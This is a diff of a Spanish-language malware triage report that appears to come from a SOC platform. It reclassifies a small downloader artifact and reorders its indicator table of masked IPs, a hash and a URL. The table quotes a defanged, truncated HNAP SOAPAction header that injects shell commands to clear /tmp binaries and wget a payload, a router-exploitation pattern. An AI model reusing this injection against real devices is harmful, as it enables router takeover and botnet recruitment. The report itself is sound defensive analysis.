@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 338 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `GetDeviceSettings` en `hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,11 +53,11 @@ SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd%2B/tmp;rm%2Bm
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
-| ip | 201.51.13.XXX | static_analysis |
 | url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
-| hash | 39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9 | static_analysis |
+| ip | 201.51.13.XXX | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
 | command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bht | strings |
+| hash | 39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9 | static_analysis |
 
 ## 🔎 Triage
 
